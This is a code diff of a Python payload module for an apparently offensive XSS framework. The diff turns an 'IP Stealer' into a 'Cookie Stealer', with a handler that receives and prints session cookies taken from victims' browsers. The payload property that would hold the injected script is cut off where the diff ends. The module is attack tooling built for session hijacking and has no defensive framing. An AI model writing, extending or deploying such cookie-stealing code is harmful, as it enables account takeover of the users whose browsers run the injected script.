@@ -8,19 +8,19 @@ from simplexss.api import (
 
 class Payload(BasePayload):
     AUTHOR = 'crazyproger1'
-    DESCRIPTION = 'Steals IP.'
-    NAME = 'IP Stealer'
+    DESCRIPTION = 'Steals cookies.'
+    NAME = 'Cookie Stealer'
     VERSION = '0.0.1'
 
-    async def on_ip(self, client: BaseClient, event: BaseEvent):
-        await self.io.print(f'IP: {event.data.get("ip", "unknown")}')
+    async def on_cookies(self, client: BaseClient, event: BaseEvent):
+        await self.io.print(f'Cookies: {event.data.get("cookies")}')
 
     async def on_connection(self, client: BaseClient, event: BaseEvent):
         await self.io.print(f'Connection established: {client.origin}')
 
     def bind_endpoints(self):
         self.transport.bind_endpoint('connection', self.on_connection)
-        self.transport.bind_endpoint('ip', self.on_ip)
+        self.transport.bind_endpoint('cookies', self.on_cookies)
 
     @property
     def payload(self) -> str:
